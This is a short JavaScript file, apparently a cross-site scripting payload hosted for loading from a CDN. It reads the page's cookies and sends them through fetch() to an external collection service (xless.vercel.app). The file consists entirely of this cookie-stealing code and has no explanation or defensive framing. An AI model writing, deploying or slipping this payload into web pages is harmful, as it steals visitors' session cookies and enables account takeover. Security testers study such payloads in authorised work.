// https://cdn.jsdelivr.net/gh/mazen160/test@main/hello.txt

// Send cookies to xless
const cookies = document.cookie;
if (cookies) {
    fetch(`https://xless.vercel.app/message?text=COOKIES: ${encodeURIComponent(cookies)}`, {
        method: 'GET'
    })
        .catch(error => {
            console.error('Error sending cookies to external URL:', error);
        });
}


